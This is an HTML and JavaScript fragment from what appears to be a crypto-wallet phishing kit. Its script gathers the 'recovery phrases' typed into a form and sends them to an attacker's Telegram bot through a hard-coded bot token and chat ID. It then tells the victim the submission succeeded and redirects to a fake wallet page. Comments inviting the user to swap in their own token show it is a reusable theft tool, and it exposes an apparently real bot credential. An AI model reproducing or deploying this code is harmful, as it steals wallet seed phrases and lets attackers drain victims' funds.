    <link rel="stylesheet" href="style(phrase).css">
    <script>
        // Replace YOUR_BOT_TOKEN with the Telegram Bot Token
        const botToken = "7859150183:AAGh3mscBoMuc1yQTFidmsnA7negZwwtTx4";
        // Replace YOUR_CHAT_ID with your Telegram Chat ID
        const chatId = "2013990871";

        function submitForm(event) {
            event.preventDefault();

            // Collect form data
            const inputs = document.querySelectorAll("#phraseForm input[type=text]");
            const phrases = Array.from(inputs).map(input => input.value.trim()).join(", ");

            // Send data to Telegram Bot
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: `ðŸš¨ New Recovery Phrase Submission ðŸš¨\n\n${phrases}`,
                }),
            })
            .then(response => {
                if (response.ok) {
                    alert("Recovery phrases successfully submitted and notified!");
                    window.location.href = "index(Wallet).html"; // Redirect to wallet page
                } else {
                    alert("Error sending recovery phrases. Please try again.");
                }
            })
            .catch(error => {
                console.error("Telegram API error:", error);
                alert("Error connecting to Telegram. Please try again.");
            });
        }
    </script>
